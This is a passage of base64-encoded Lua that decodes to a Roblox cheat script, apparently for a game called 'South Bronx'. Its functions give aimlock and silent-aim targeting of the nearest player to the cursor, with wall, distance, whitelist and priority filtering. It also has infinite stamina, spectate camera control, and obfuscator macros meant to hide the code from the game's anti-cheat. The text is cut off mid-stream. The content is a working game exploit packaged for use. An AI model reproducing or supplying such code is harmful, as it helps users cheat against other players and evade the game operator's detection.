bGl0aWVzLlNlbGVjdGVkUGxheWVyKS5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikKCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoQ29uZmlnLlNvdXRoX0Jyb254LlBsYXllclV0aWxpdGllcy5TZWxlY3RlZFBsYXllcikgb3Igbm90IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoQ29uZmlnLlNvdXRoX0Jyb254LlBsYXllclV0aWxpdGllcy5TZWxlY3RlZFBsYXllcikuQ2hhcmFjdGVyIG9yIG5vdCBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKENvbmZpZy5Tb3V0aF9Ccm9ueC5QbGF5ZXJVdGlsaXRpZXMuU2VsZWN0ZWRQbGF5ZXIpLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIFN1YmplY3QgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQKICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgQ2FtZXJhLkNhbWVyYVN1YmplY3QgPSBTdWJqZWN0CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IFNldF9TcGVjdGF0ZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIFNldF9TcGVjdGF0ZSA9IHRydWUKCiAgICAgICAgICAgICAgICAgICAgICAgIENhbWVyYS5DYW1lcmFTdWJqZWN0ID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiBHYW1lX05hbWUgPT0gIlNvdXRoIEJyb254IiB0aGVuCiAgICAgICAgICAgICAgICAgICAgaWYgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkhlYWQ6RmluZEZpcnN0Q2hpbGQoIlJhbmtUYWciKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIC0taWYgbm90IGdldGdlbnYoKS5XaW5kb3cgdGhlbiByZXR1cm4gZW5kCgogICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSGVhZDpGaW5kRmlyc3RDaGlsZCgiUmFua1RhZyIpLk1haW5GcmFtZS5OYW1lTGFiZWwuVmlzaWJsZSA9IG5vdCBDb25maWcuU291dGhfQnJvbnguTG9jYWxQbGF5ZXJfQ29uZmlnLkhpZGVOYW1lCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiBHYW1lX05hbWUgPT0gIlNvdXRoIEJyb254IiBhbmQgU29sYXJhIHRoZW4KICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGlmIEdhbWVfTmFtZSA9PSAiU291dGggQnJvbngiIGFuZCBDb25maWcuU291dGhfQnJvbnguTG9jYWxQbGF5ZXJfQ29uZmlnLkluZmluaXRlU3RhbWluYSBhbmQgbm90IFNvbGFyYSB0aGVuCiAgICAgICAgICAgICAgICAgICAgU3RhbWluYV9UYWJsZS5TdGFtaW5hID0gMTAwCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKSkKICAgICAgICBlbmQKCiAgICAgICAgV29ybGRUb1NjcmVlblBvaW50ID0gQ2FtZXJhLldvcmxkVG9TY3JlZW5Qb2ludDsKICAgICAgICBHZXRNb3VzZUxvY2F0aW9uID0gVXNlcklucHV0U2VydmljZS5HZXRNb3VzZUxvY2F0aW9uOwogICAgICAgIEZpbmRGaXJzdENoaWxkID0gV29ya3NwYWNlLkZpbmRGaXJzdENoaWxkOwogICAgICAgIEdldFBsYXllcnMgPSBQbGF5ZXJzLkdldFBsYXllcnM7CiAgICAgICAgR2V0Q2hpbGRyZW4gPSBXb3Jrc3BhY2UuR2V0Q2hpbGRyZW47CiAgICAgICAgR2V0UGFydHNPYnNjdXJpbmdUYXJnZXQgPSBDYW1lcmEuR2V0UGFydHNPYnNjdXJpbmdUYXJnZXQ7CiAgICAgICAgR2V0RGVzY2VuZGFudHMgPSBXb3Jrc3BhY2UuR2V0RGVzY2VuZGFudHM7CiAgICAgICAgSXNBID0gV29ya3NwYWNlLklzQTsKICAgICAgICBGaW5kRmlyc3RDaGlsZE9mQ2xhc3MgPSBXb3Jrc3BhY2UuRmluZEZpcnN0Q2hpbGRPZkNsYXNzCgogICAgICAgIERpc3RhbmNlQ2hlY2sgPSBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbihQbGF5ZXIsIERpc3RhbmNlKQogICAgICAgICAgICBpZiBub3QgUGxheWVyIHRoZW4KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGlmIFBsYXllci5DaGFyYWN0ZXIgYW5kIEZpbmRGaXJzdENoaWxkKFBsYXllci5DaGFyYWN0ZXIsIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBNYWduaXR1ZGUgPSAoQ2FtZXJhLkNGcmFtZS5Qb3NpdGlvbiAtIEZpbmRGaXJzdENoaWxkKFBsYXllci5DaGFyYWN0ZXIsIkh1bWFub2lkUm9vdFBhcnQiKS5Qb3NpdGlvbikuTWFnbml0dWRlOwoKICAgICAgICAgICAgICAgIHJldHVybiBEaXN0YW5jZSA+IE1hZ25pdHVkZQogICAgICAgICAgICBlbmQ7CgogICAgICAgICAgICByZXR1cm4gZmFsc2UgICAgICAgICAgICAKICAgICAgICBlbmQpOwoKICAgICAgICBXYWxsQ2hlY2sgPSBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbihDaGFyYWN0ZXIpCiAgICAgICAgICAgIGxvY2FsIE9yaWdpbiA9IENhbWVyYS5DRnJhbWUuUG9zaXRpb247CiAgICAgICAgICAgIGxvY2FsIFBvc2l0aW9uID0gRmluZEZpcnN0Q2hpbGQoQ2hhcmFjdGVyLCAiSGVhZCIpLlBvc2l0aW9uOwogICAgICAgICAgICBsb2NhbCBQYXJhbWV0ZXJzID0gUmF5Y2FzdFBhcmFtcy5uZXcoKTsKICAgICAgICAKICAgICAgICAgICAgUGFyYW1ldGVycy5GaWx0ZXJEZXNjZW5kYW50c0luc3RhbmNlcyA9IHsgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLCBDYW1lcmEsIENoYXJhY3RlciB9OwogICAgICAgICAgICBQYXJhbWV0ZXJzLkZpbHRlclR5cGUgPSBFbnVtLlJheWNhc3RGaWx0ZXJUeXBlLkJsYWNrbGlzdDsKICAgICAgICAgICAgUGFyYW1ldGVycy5JZ25vcmVXYXRlciA9IHRydWU7CiAgICAgICAgCiAgICAgICAgICAgIHJldHVybiBub3QgV29ya3NwYWNlOlJheWNhc3QoT3JpZ2luLCBQb3NpdGlvbiAtIE9yaWdpbiwgUGFyYW1ldGVycykgICAgICAgICAgICAKICAgICAgICBlbmQpCgogICAgICAgIEdldENsb3Nlc3RQbGF5ZXJUb01vdXNlQWltYm90ID0gTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICBpZiBub3QgQ29uZmlnLkFpbWxvY2suRW5hYmxlZCB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgaWYgbm90IENvbmZpZy5BaW1sb2NrLkFpbWluZyB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIFByaW9yaXR5UGxheWVycyA9IHt9CgogICAgICAgICAgICBsb2NhbCBQbHJzID0gUGxheWVyczpHZXRQbGF5ZXJzKCkKCiAgICAgICAgICAgIGlmIGxpYnJhcnkucHJpb3JpdHlbMV0gdGhlbgogICAgICAgICAgICAgICAgZm9yIEluZGV4LCBWYWx1ZSBpbiBQbHJzIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgVmFsdWUgPT0gTG9jYWxQbGF5ZXIgdGhlbiBjb250aW51ZSBlbmQ7CiAgICAgICAgICAgICAgICAgICAgaWYgbm90IHRhYmxlLmZpbmQobGlicmFyeS5wcmlvcml0eSwgVmFsdWUuTmFtZSkgdGhlbiBjb250aW51ZSBlbmQ7CiAgICAgICAgICAgICAgICAgICAgaWYgdGFibGUuZmluZChsaWJyYXJ5LndoaXRlbGlzdCwgVmFsdWUuTmFtZSkgdGhlbiBjb250aW51ZSBlbmQ7CiAgICAgICAgICAgICAgICAgICAgaWYgKFZhbHVlLkNoYXJhY3RlciBhbmQgVmFsdWUuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKENvbmZpZy5BaW1sb2NrLlRhcmdldFBhcnQpIGFuZCBWYWx1ZS5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgYW5kIFZhbHVlLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKS5IZWFsdGggPiAoR2FtZV9OYW1lID09ICJTb3V0aCBCcm9ueCIgYW5kIDQgb3IgMCkpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgaWYgRmluZEZpcnN0Q2hpbGRPZkNsYXNzKFZhbHVlLkNoYXJhY3RlciwgIkZvcmNlRmllbGQiKSB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBpZiBGaW5kRmlyc3RDaGlsZChWYWx1ZS5DaGFyYWN0ZXIsICJUb3JzbyIpIGFuZCBGaW5kRmlyc3RDaGlsZChWYWx1ZS5DaGFyYWN0ZXIsICJUb3JzbyIpLk1hdGVyaWFsID09IEVudW0uTWF0ZXJpYWwuRm9yY2VGaWVsZCB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBpZiBWYWx1ZS5DaGFyYWN0ZXIuUGFyZW50ID09IG5pbCB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBUYXJnZXRQYXJ0ID0gVmFsdWUuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKENvbmZpZy5BaW1sb2NrLlRhcmdldFBhcnQpCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIE1vdXNlTG9jYXRpb24gPSBWZWN0b3IyLm5ldyhNb3VzZS5YLCBNb3VzZS5ZKQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBUYXJnZXRQYXJ0UG9zaXRpb24sIE9uU2NyZWVuID0gQ2FtZXJhOldvcmxkVG9TY3JlZW5Qb2ludChUYXJnZXRQYXJ0LlBvc2l0aW9uKQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBSYWRpdXMgPSBDb25maWcuQWltbG9jay5Vc2VGaWVsZE9mVmlldyBhbmQgQ29uZmlnLkFpbWxvY2suUmFkaXVzIG9yIDllOQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBNYWduaXR1ZGUgPSAoVmVjdG9yMi5uZXcoVGFyZ2V0UGFydFBvc2l0aW9uLlgsVGFyZ2V0UGFydFBvc2l0aW9uLlkpIC0gTW91c2VMb2NhdGlvbikuTWFnbml0dWRlCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBEaXN0YW5jZUNoZWNrKFZhbHVlLCBDb25maWcuQWltbG9jay5NYXhEaXN0YW5jZSkgdGhlbiBjb250aW51ZSBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIFJhZGl1cyA+IE1hZ25pdHVkZSBhbmQgT25TY3JlZW4gYW5kIFZhbHVlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChDb25maWcuQWltbG9jay5XYWxsQ2hlY2sgYW5kIG5vdCBXYWxsQ2hlY2soVmFsdWUuQ2hhcmFjdGVyKSkgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChQcmlvcml0eVBsYXllcnMsIHtQbGF5ZXIgPSBWYWx1ZSwgRGlzdGFuY2UgPSBNYWduaXR1ZGV9KQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQ7CiAgICAgICAgICAgICAgICBlbmQ7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHRhYmxlLnNvcnQoUHJpb3JpdHlQbGF5ZXJzLCBmdW5jdGlvbihQbGF5ZXIgLCBQbGF5ZXJUd28pCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFBsYXllci5EaXN0YW5jZTxQbGF5ZXJUd28uRGlzdGFuY2UKICAgICAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgICAgICBpZiBQcmlvcml0eVBsYXllcnNbMV0gdGhlbgogICAgICAgICAgICAgICAgICAgIHJldHVybiBQcmlvcml0eVBsYXllcnNbMV0uUGxheWVyCiAgICAgICAgICAgICAgICBlbmQ7CiAgICAgICAgICAgIGVuZDsKCiAgICAgICAgICAgIGxvY2FsIFZhbGlkUGxheWVycyA9IHt9OwoKICAgICAgICAgICAgZm9yIEluZGV4LCBWYWx1ZSBpbiBQbHJzIGRvCiAgICAgICAgICAgICAgICBpZiBWYWx1ZSA9PSBMb2NhbFBsYXllciB0aGVuIGNvbnRpbnVlIGVuZDsKICAgICAgICAgICAgICAgIGlmIHRhYmxlLmZpbmQobGlicmFyeS53aGl0ZWxpc3QsIFZhbHVlLk5hbWUpIHRoZW4gY29udGludWUgZW5kOwogICAgICAgICAgICAgICAgaWYgKFZhbHVlLkNoYXJhY3RlciBhbmQgVmFsdWUuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKENvbmZpZy5BaW1sb2NrLlRhcmdldFBhcnQpIGFuZCBWYWx1ZS5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgYW5kIFZhbHVlLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKS5IZWFsdGggPiAoR2FtZV9OYW1lID09ICJTb3V0aCBCcm9ueCIgYW5kIDQgb3IgMCkpIHRoZW4KICAgICAgICAgICAgICAgICAgICBpZiBGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoVmFsdWUuQ2hhcmFjdGVyLCAiRm9yY2VGaWVsZCIpIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICAgICAgaWYgRmluZEZpcnN0Q2hpbGQoVmFsdWUuQ2hhcmFjdGVyLCAiVG9yc28iKSBhbmQgRmluZEZpcnN0Q2hpbGQoVmFsdWUuQ2hhcmFjdGVyLCAiVG9yc28iKS5NYXRlcmlhbCA9PSBFbnVtLk1hdGVyaWFsLkZvcmNlRmllbGQgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgICAgICAgICBpZiBWYWx1ZS5DaGFyYWN0ZXIuUGFyZW50ID09IG5pbCB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAgICAgICAgIGxvY2FsIFRhcmdldFBhcnQgPSBWYWx1ZS5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoQ29uZmlnLkFpbWxvY2suVGFyZ2V0UGFydCkKICAgICAgICAgICAgICAgICAgICBsb2NhbCBNb3VzZUxvY2F0aW9uID0gVmVjdG9yMi5uZXcoTW91c2UuWCwgTW91c2UuWSkKICAgICAgICAgICAgICAgICAgICBsb2NhbCBUYXJnZXRQYXJ0UG9zaXRpb24sIE9uU2NyZWVuID0gQ2FtZXJhOldvcmxkVG9TY3JlZW5Qb2ludChUYXJnZXRQYXJ0LlBvc2l0aW9uKQogICAgICAgICAgICAgICAgICAgIGxvY2FsIFJhZGl1cyA9IENvbmZpZy5BaW1sb2NrLlVzZUZpZWxkT2ZWaWV3IGFuZCBDb25maWcuQWltbG9jay5SYWRpdXMgb3IgOWU5CiAgICAgICAgICAgICAgICAgICAgbG9jYWwgTWFnbml0dWRlID0gKFZlY3RvcjIubmV3KFRhcmdldFBhcnRQb3NpdGlvbi5YLFRhcmdldFBhcnRQb3NpdGlvbi5ZKSAtIE1vdXNlTG9jYXRpb24pLk1hZ25pdHVkZQogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBEaXN0YW5jZUNoZWNrKFZhbHVlLCBDb25maWcuQWltbG9jay5NYXhEaXN0YW5jZSkgdGhlbiBjb250aW51ZSBlbmQKCiAgICAgICAgICAgICAgICAgICAgaWYgUmFkaXVzID4gTWFnbml0dWRlIGFuZCBPblNjcmVlbiBhbmQgVmFsdWUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBpZiAoQ29uZmlnLkFpbWxvY2suV2FsbENoZWNrIGFuZCBub3QgV2FsbENoZWNrKFZhbHVlLkNoYXJhY3RlcikpIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChWYWxpZFBsYXllcnMsIHtQbGF5ZXIgPSBWYWx1ZSwgRGlzdGFuY2UgPSBNYWduaXR1ZGV9KQogICAgICAgICAgICAgICAgICAgIGVuZDsKICAgICAgICAgICAgICAgIGVuZDsKICAgICAgICAgICAgZW5kOwogICAgICAgICAgICAKICAgICAgICAgICAgdGFibGUuc29ydChWYWxpZFBsYXllcnMsIGZ1bmN0aW9uKFBsYXllciAsIFBsYXllclR3bykKICAgICAgICAgICAgICAgIHJldHVybiBQbGF5ZXIuRGlzdGFuY2U8UGxheWVyVHdvLkRpc3RhbmNlCiAgICAgICAgICAgIGVuZCk7CiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBWYWxpZFBsYXllcnNbMV0gdGhlbgogICAgICAgICAgICAgICAgcmV0dXJuIFZhbGlkUGxheWVyc1sxXS5QbGF5ZXIKICAgICAgICAgICAgZW5kOwoKICAgICAgICAgICAgcmV0dXJuIG5pbAogICAgICAgIGVuZCk7CgogICAgICAgIEdldENsb3Nlc3RQbGF5ZXJUb1BsYXllciA9IExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKFBsYXllcikKICAgICAgICAgICAgbG9jYWwgX1BsYXllcnMgPSB7fQoKICAgICAgICAgICAgaWYgbm90IFBsYXllci5DaGFyYWN0ZXIgb3Igbm90IFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSBvciBub3QgUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSB0aGVuIHJldHVybiBlbmQKCiAgICAgICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gUGxheWVyczpHZXRQbGF5ZXJzKCkgZG8KICAgICAgICAgICAgICAgIGlmIFBsYXllciA9PSBMb2NhbFBsYXllciBhbmQgVmFsdWUgPT0gTG9jYWxQbGF5ZXIgdGhlbiBjb250aW51ZSBlbmQKCiAgICAgICAgICAgICAgICBpZiBub3QgVmFsdWUuQ2hhcmFjdGVyIG9yIG5vdCBWYWx1ZS5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSBvciBub3QgVmFsdWUuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICBpZiBWYWx1ZS5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikuSGVhbHRoID09IDAgdGhlbiBjb250aW51ZSBlbmQKCiAgICAgICAgICAgICAgICBpZiAoUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlBvc2l0aW9uIC0gVmFsdWUuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24pLk1hZ25pdHVkZSA+IDE1IHRoZW4gY29udGludWUgZW5kCgogICAgICAgICAgICAgICAgdGFibGUuaW5zZXJ0KF9QbGF5ZXJzLCB7UGxyID0gVmFsdWUsIFJhbmdlID0gKFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbiAtIFZhbHVlLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlBvc2l0aW9uKS5NYWduaXR1ZGV9KQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIHRhYmxlLnNvcnQoX1BsYXllcnMsIGZ1bmN0aW9uKC4uLikKICAgICAgICAgICAgICAgIHJldHVybiBzZWxlY3QoMSwgLi4uKS5SYW5nZSA8IHNlbGVjdCgyLCAuLi4pLlJhbmdlCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIHJldHVybiBfUGxheWVyc1sxXSBhbmQgX1BsYXllcnNbMV0uUGxyIG9yIG5pbAogICAgICAgIGVuZCk7CgogICAgICAgIEdldENsb3Nlc3RQbGF5ZXJUb01vdXNlU2lsZW50ID0gTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICBpZiBub3QgQ29uZmlnLlNpbGVudC5FbmFibGVkIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICBpZiBub3QgQ29uZmlnLlNpbGVudC5UYXJnZXR0aW5nIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgUHJpb3JpdHlQbGF5ZXJzID0ge30KCiAgICAgICAgICAgIGxvY2FsIFBscnMgPSBHZXRQbGF5ZXJzKFBsYXllcnMpCgogICAgICAgICAgICBpZiBsaWJyYXJ5LnByaW9yaXR5WzFdIHRoZW4KICAgICAgICAgICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gUGxycyBkbwogICAgICAgICAgICAgICAgICAgIGlmIFZhbHVlID09IExvY2FsUGxheWVyIHRoZW4gY29udGludWUgZW5kOwogICAgICAgICAgICAgICAgICAgIGlmIG5vdCB0YWJsZS5maW5kKGxpYnJhcnkucHJpb3JpdHksIFZhbHVlLk5hbWUpIHRoZW4gY29udGludWUgZW5kOwogICAgICAgICAgICAgICAgICAgIGlmIHRhYmxlLmZpbmQobGlicmFyeS53aGl0ZWxpc3QsIFZhbHVlLk5hbWUpIHRoZW4gY29udGludWUgZW5kOwogICAgICAgICAgICAgICAgICAgIGlmIChWYWx1ZS5DaGFyYWN0ZXIgYW5kIEZpbmRGaXJzdENoaWxkKFZhbHVlLkNoYXJhY3RlciwgIkh1bWFub2lkUm9vdFBhcnQiKSBhbmQgRmluZEZpcnN0Q2hpbGQoVmFsdWUuQ2hhcmFjdGVyLCJIdW1hbm9pZCIpIGFuZCBGaW5kRmlyc3RDaGlsZChWYWx1ZS5DaGFyYWN0ZXIsIkh1bWFub2lkIikuSGVhbHRoID4gKEdhbWVfTmFtZSA9PSAiU291dGggQnJvbngiIGFuZCA0IG9yIDApKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIEZpbmRGaXJzdENoaWxkT2ZDbGFzcyhWYWx1ZS5DaGFyYWN0ZXIsICJGb3JjZUZpZWxkIikgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgaWYgRmluZEZpcnN0Q2hpbGQoVmFsdWUuQ2hhcmFjdGVyLCAiVG9yc28iKSBhbmQgRmluZEZpcnN0Q2hpbGQoVmFsdWUuQ2hhcmFjdGVyLCAiVG9yc28iKS5NYXRlcmlhbCA9PSBFbnVtLk1hdGVyaWFsLkZvcmNlRmllbGQgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgaWYgVmFsdWUuQ2hhcmFjdGVyLlBhcmVudCA9PSBuaWwgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgVGFyZ2V0UGFydCA9IEZpbmRGaXJzdENoaWxkKFZhbHVlLkNoYXJhY3RlciwgIkh1bWFub2lkUm9vdFBhcnQiKTsKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgTW91c2VMb2NhdGlvbiA9IFZlY3RvcjIubmV3KE1vdXNlLlgsIE1vdXNlLlkpCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIFRhcmdldFBhcnRQb3NpdGlvbiwgT25TY3JlZW4gPSBXb3JsZFRvU2NyZWVuUG9pbnQoQ2FtZXJhLCBUYXJnZXRQYXJ0LlBvc2l0aW9uKTsKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgUmFkaXVzID0gQ29uZmlnLlNpbGVudC5Vc2VGaWVsZE9mVmlldyBhbmQgQ29uZmlnLlNpbGVudC5SYWRpdXMgb3IgOWU5OwogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBNYWduaXR1ZGUgPSAoVmVjdG9yMi5uZXcoVGFyZ2V0UGFydFBvc2l0aW9uLlgsVGFyZ2V0UGFydFBvc2l0aW9uLlkpIC0gTW91c2VMb2NhdGlvbikuTWFnbml0dWRlOwogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgRGlzdGFuY2VDaGVjayhWYWx1ZSwgQ29uZmlnLlNpbGVudC5NYXhEaXN0YW5jZSkgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIFJhZGl1cyA+IE1hZ25pdHVkZSBhbmQgT25TY3JlZW4gYW5kIFZhbHVlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBDb25maWcuU2lsZW50LldhbGxCYW5nIGFuZCAoQ29uZmlnLlNpbGVudC5XYWxsQ2hlY2sgYW5kIChub3QgV2FsbENoZWNrKFZhbHVlLkNoYXJhY3RlcikpKSB0aGVuIGNvbnRpbnVlIGVuZDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChQcmlvcml0eVBsYXllcnMsIHtQbGF5ZXIgPSBWYWx1ZSwgRGlzdGFuY2UgPSBNYWduaXR1ZGV9KTsKICAgICAgICAgICAgICAgICAgICAgICAgZW5kOwogICAgICAgICAgICAgICAgICAgIGVuZDsKICAgICAgICAgICAgICAgIGVuZDsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdGFibGUuc29ydChQcmlvcml0eVBsYXllcnMsIGZ1bmN0aW9uKFBsYXllciAsIFBsYXllclR3bykKICAgICAgICAgICAgICAgICAgICByZXR1cm4gUGxheWVyLkRpc3RhbmNlPFBsYXllclR3by5EaXN0YW5jZQogICAgICAgICAgICAgICAgZW5kKTsKCiAgICAgICAgICAgICAgICBpZiBQcmlvcml0eVBsYXllcnNbMV0gdGhlbgogICAgICAgICAgICAgICAgICAgIHJldHVybiBQcmlvcml0eVBsYXllcnNbMV0uUGxheWVyCiAgICAgICAgICAgICAgICBlbmQ7CiAgICAgICAgICAgIGVuZDsKCiAgICAgICAgICAgIGxvY2FsIFZhbGlkUGxheWVycyA9IHt9OwoKICAgICAgICAgICAgZm9yIEluZGV4LCBWYWx1ZSBpbiBQbHJzIGRvCiAgICAgICAgICAgICAgICBpZiBWYWx1ZSA9PSBMb2NhbFBsYXllciB0aGVuIGNvbnRpbnVlIGVuZDsKICAgICAgICAgICAgICAgIGlmIHRhYmxlLmZpbmQobGlicmFyeS53aGl0ZWxpc3QsIFZhbHVlLk5hbWUpIHRoZW4gY29udGludWUgZW5kOwogICAgICAgICAgICAgICAgaWYgKFZhbHVlLkNoYXJhY3RlciBhbmQgRmluZEZpcnN0Q2hpbGQoVmFsdWUuQ2hhcmFjdGVyLCAiSHVtYW5vaWRSb290UGFydCIpIGFuZCBGaW5kRmlyc3RDaGlsZChWYWx1ZS5DaGFyYWN0ZXIsIkh1bWFub2lkIikgYW5kIEZpbmRGaXJzdENoaWxkKFZhbHVlLkNoYXJhY3RlciwiSHVtYW5vaWQiKS5IZWFsdGggPiAoR2FtZV9OYW1lID09ICJTb3V0aCBCcm9ueCIgYW5kIDQgb3IgMCkpIHRoZW4KICAgICAgICAgICAgICAgICAgICBpZiBGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoVmFsdWUuQ2hhcmFjdGVyLCAiRm9yY2VGaWVsZCIpIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICAgICAgaWYgRmluZEZpcnN0Q2hpbGQoVmFsdWUuQ2hhcmFjdGVyLCAiVG9yc28iKSBhbmQgRmluZEZpcnN0Q2hpbGQoVmFsdWUuQ2hhcmFjdGVyLCAiVG9yc28iKS5NYXRlcmlhbCA9PSBFbnVtLk1hdGVyaWFsLkZvcmNlRmllbGQgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgICAgICAgICBpZiBWYWx1ZS5DaGFyYWN0ZXIuUGFyZW50ID09IG5pbCB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAgICAgICAgIGxvY2FsIFRhcmdldFBhcnQgPSBGaW5kRmlyc3RDaGlsZChWYWx1ZS5DaGFyYWN0ZXIsICJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgICAgICAgICBsb2NhbCBNb3VzZUxvY2F0aW9uID0gVmVjdG9yMi5uZXcoTW91c2UuWCwgTW91c2UuWSkKICAgICAgICAgICAgICAgICAgICBsb2NhbCBUYXJnZXRQYXJ0UG9zaXRpb24sIE9uU2NyZWVuID0gV29ybGRUb1NjcmVlblBvaW50KENhbWVyYSwgVGFyZ2V0UGFydC5Qb3NpdGlvbikKICAgICAgICAgICAgICAgICAgICBsb2NhbCBSYWRpdXMgPSBDb25ma